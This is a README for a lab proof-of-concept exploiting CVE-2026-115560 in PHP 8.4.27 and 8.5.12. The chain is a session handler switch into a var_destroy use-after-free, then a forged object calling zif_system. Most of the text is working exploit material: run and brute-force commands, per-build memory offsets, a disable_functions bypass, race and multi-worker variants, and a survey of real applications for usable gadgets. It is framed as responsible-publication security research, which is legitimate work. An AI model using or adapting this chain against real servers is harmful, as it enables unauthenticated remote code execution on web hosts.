# lab-115560 — CVE-2026-115560 → var_destroy → `zif_system`

**LAB-ONLY.** Targets `127.0.0.1`. Fixed benign command `id>/tmp/vd 2>&1`;
there is no arbitrary-command interface. Published 2026-10-31; see
`docs/RESPONSIBLE_PUBLICATION.md`.

## Lab images

`docker-compose.workers.yml` pins `php:8.4.27-apache-arm64`, which is a **local
alias** for the official multi-arch image, not an upstream tag. Create it once:

```sh
docker pull php:8.4.27-apache
docker tag  php:8.4.27-apache php:8.4.27-apache-arm64
```

`lab-pure-modphp/docker-compose.yml` uses the same convention for 8.4.26.

## What this proves

A pre-auth RCE on **patched** PHP 8.4.27 / 8.5.12 (patched for
CVE-2026-109618 / -109619, unpatched for CVE-2026-115560) with **no application
`unserialize()` sink**:

1. **CVE-2026-115560** — the upload-progress hook writes the session file under
   the configured `php_serialize` handler. The app switches to the `php`
   handler at runtime before `session_start()`. The `php` decoder splits at the
   first `|` in the progress value and hands the bytes after it to
   `php_var_unserialize()`.
2. **var_destroy UAF** — the injected `a:1018:{…}` array has duplicate keys.
   The `CachePurge` object's `__destruct()` sprays same-size strings and
   re-enters `unserialize('R:1020;')`, walking the freed `var_entries` chunk.
3. **Forged chain** — a fake `zend_reference` → `zend_object` →
   `handlers->dtor_obj = zif_system` executes the fixed benign command.

The session decoder itself is the var_destroy sink.

## Preconditions

- `session.serialize_handler = php_serialize` in the server config
  (`php_binary` is also named by the advisory, but the ~10 KB payload needs a
  length-prefixed key; the filename route truncates at a null byte and
  `php_binary` caps the progress key at 127 bytes).
- The app calls `ini_set('session.serialize_handler', 'php')` **before**
  `session_start()`.
- `session.upload_progress.enabled = On`.
- A loaded class with a `__destruct()` that sprays and re-enters `unserialize()`
  (the lab uses `CachePurge`).
- A carrier address seed. On arm64 the ZendMM `main` chunk has ~9 bits of
  entropy (512 slots), so the window scan below needs no `/proc`.

## Layout

```
lab-115560/
  docker-compose.yml       :18200 8.4.27 | :18201 8.5.12 | :18202 8.4.27 upload_progress=Off
  php-115560.ini           php_serialize, upload_progress On, cleanup Off, /tmp/sessions
  php-115560-noupload.ini  negative control
  apache-single.conf       one prefork child, MaxConnectionsPerChild=1
  webroot/
    index.php              consumer; defines CachePurge; switches to php; fire modes
    prime.php              writes one dummy progress record WITHOUT session_start()
    noswitch.php           negative control (no runtime handler switch)
    scan_prefix.php        lab scanner: magic hit + raw-input prefix validation
    vd_scan.php            lab scanner: first magic hit
```

`index.php` query parameters:

| param | meaning |
|---|---|
| `?m=0` | first dtor records pid and sleeps (diagnostic address) |
| `?m=2` | fire-shaped spray then sleep (diagnostic) |
| `?m=4` | **skip the dry mid-parse dtor; fire on the real var_destroy dtor** |
| `?m=5` | **skip the dry dtor; hold at the real var_destroy dtor** (measure) |
| `?m=1` | fire on every dtor (single-record 8.4.27 / 8.5.12 diagnostic) |
| `?r=` | `R:` reference id (default 1020) |
| `?s=` | spray string length (default 8135; the driver uses 3048 on 8.4.x) |

## Run

```bash
cd lab-115560 && docker compose up -d
cd ..

# end-to-end: lab-assisted measure, then fire
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18200 --container php2shell-115560-8427 \
  --build 8.4.27 run

python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18201 --container php2shell-115560-8512 \
  --build 8.5.12 run
```

Expected: `[EVIDENCE] 115560 session decode -> var_destroy -> uid=33` and
`uid=33(www-data) …` in `/tmp/vd`.

### No-`/proc` final (main-window brute force)

```bash
# 8.4.27: lib = main + 0x2130000, zif offset 0x431510
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18200 --container php2shell-115560-8427 --build 8.4.27 \
  --brute --delta 0x6c019 --lib-delta 0x2130000 --zif-off 0x431510 --fire-mode 4

# 8.5.12: lib = main - 0x3600000, zif offset 0x535490
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18201 --container php2shell-115560-8512 --build 8.5.12 \
  --brute --delta 0x6c019 --lib-delta=-0x3600000 --zif-off 0x535490 --fire-mode 4
```

The brute mode scans `0xFFFF78000000..0xFFFFC0000000` in `0x200000` steps
(576 candidates), using a **fresh SID and a `/prime.php` dummy record per
attempt**. No `/proc`, no measurement, no debugger.

## Calibration (this app/request shape)

| build | real-dtor delta | dry-dtor delta | `lib - main` | `zif_system` offset | spray |
|---|---|---|---|---|---|
| 8.4.27 | `0x6c019` | `0x69037` | `+0x2130000` | `0x431510` | `3048` |
| 8.5.12 | `0x6c019` | — | `-0x3600000` | `0x535490` | `8135` |

Reference id: `1020`.

## Findings that make it reproducible

- **Carrier buffer.** The carrier is the persistent **raw session input buffer**
  (the bytes after `|`), *not* the `s:4096` zend_string copy. The copy is freed
  when the first duplicate `i:0` is parsed, long before the `CachePurge` dtor
  fires at the duplicate `i:99999`. `scan_prefix.php` distinguishes the two by
  checking that `a:1018:{i:0;s:4096:"` sits immediately before the blob.
- **Two dtors on 8.4.27.** The mid-parse duplicate-key destroy is a dry run
  (`inv=1`); the real UAF is the decode-failure `var_destroy` dtor (`inv=2`).
  `?m=5` holds at the real one for measurement; `?m=4` skips the dry one and
  fires at the real one.
- **Two session records.** A single clean record makes 8.4.27's decode succeed
  and only the dry dtor fires. `/prime.php` writes one valid dummy record
  (without `session_start()`); the exploit request appends the real record, and
  the `php` decoder's record loop gives the real `inv=2` dtor.
- **Spray size class on 8.4.27.** `s=8135` makes a `8135+24+1 = 8160` byte
  string (2 pages); the allocator can coalesce/split the run so the string base
  is before the page-aligned `var_entries` chunk, and the re-entry reads
  `0x41…` → crash. `s=3048` makes `3048+24+1 = 3073` bytes (1 page), which can
  start exactly at the page-aligned chunk base; the key lands at
  `var_entries->data[1]`, which is what `R:1020` dereferences. 8.5.12 uses
  `8135`.
- **Fresh SID per request/attempt.** Reusing one `PHPSESSID` accumulates
  progress records in the session file (10.6 KB → 159 KB), drifting the delta
  and, on 8.4.27, removing the real dtor.

## Evidence

- **8.4.27 `run`:** `main=0xffff9e400000 lib=0xffffa0530000
  zif=0xffffa0961510 delta=0x6c019` → `uid=33(www-data)`.
- **8.5.12 `run`:** `main=0xffffa3c00000 lib=0xffffa0600000
  zif=0xffffa0b35490 delta=0x6c019` → `uid=33(www-data)`.
- **8.5.12 no-`/proc` full window:** FOUND after **351 attempts** (1406 s):
  `main=0xffffa3c00000 carrier=0xffffa3c6c02d zif=0xffffa0b35490` → `uid=33`.
- **8.4.27 no-`/proc` full window:** FOUND after **307 attempts** (1238.8 s):
  `main=0xffff9e400000 carrier=0xffff9e46c02d zif=0xffffa0961510` → `uid=33`.
  (Exact-main check: 1 attempt, 1.8 s.)
- **Controls:** `--bias-zif 0x1000` → no proof; `/noswitch.php` → HTTP 200, no
  proof; `upload_progress=Off` (`:18202`) → HTTP 200, no proof.
- **`disable_functions` bypass (8.4.27):** `:18203` with
  `system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec` disabled;
  `function_exists('system') === false` and a direct `system()` is fatal, yet
  the forged `zif_system` writes `uid=33`. See `docs/NOFUNC_115560.md`.
- **Multi-worker (8.4.27, 8 children):** works without pinning and with 7
  stalled holders; `uid=33` (`:18206`; `docs/WORKERS_115560.md`).
- **amd64/Rosetta (8.4.27):** `uid=33` with `measure_amd64.py` + explicit
  addresses (`:18207`; `docs/X86_64_115560.md`). Native x86-64 needs a leak.
- **cleanup=On race (8.4.27 / 8.5.12):** streaming upload + concurrent consumer;
  `uid=33` with delta `0x6d875` / `0x80875`; multi-child + `seed.php`; controls
  block. See `docs/RACE_WAKEUP_115560.md`.
- **`__wakeup`/`__unserialize`:** negative on both builds (the nested
  `unserialize()` is under `serialize_lock`); only `__destruct` re-enters the
  UAF. See `docs/RACE_WAKEUP_115560.md`.

## Scope — what this is **not**

This is **not a default-PHP RCE**. Default `session.serialize_handler` is
`php`; 115560 needs `php_serialize`/`php_binary` configured and the app to
switch to `php` at runtime. The **direct** lab profile uses
`session.upload_progress.cleanup=Off`; the default `cleanup=On` race is proven
separately (multi-child + `seed.php`; `docs/RACE_WAKEUP_115560.md`). Only
`__destruct` re-enters the UAF (`__wakeup`/`__unserialize` are locked/negative).
The public 115560 PoCs already achieve patched-build RCE with a
**simple** `__destruct` gadget; this chain instead needs a destructor that
sprays and re-enters `unserialize()`. See `docs/PLAN_115560.md` for the public
comparison, best bets, and decision gates.

**Gadget survey (`docs/GADGET_SURVEY_115560.md`):** no stock default app
combines the 115560 switch with a re-entry gadget. Drupal 11 core P5 is the best
real gadget (needs the non-default `serialize_handler: php` line); Roundcube is
the best precondition but has no stock gadget. Only `__destruct` runs unlocked;
`__wakeup`/`__unserialize` are under `serialize_lock` and do **not** re-enter the
UAF.

## Limits

- The arm64 18-bit `main` window makes the brute force practical. On a 28-bit
  x86-64 host it is ~2^19 and needs a leak (same structural ceiling as the
  existing Plan B).
- The delta / `lib - main` / `zif` offset are per-request-shape and per-build;
  re-measure for a different app or a different PHP build.
- The `CachePurge` re-entry destructor is a lab gadget. A real target needs an
  equivalent loaded class (a cache/flush destructor that sprays and re-enters
  `unserialize()`), or another way to obtain the same primitive.
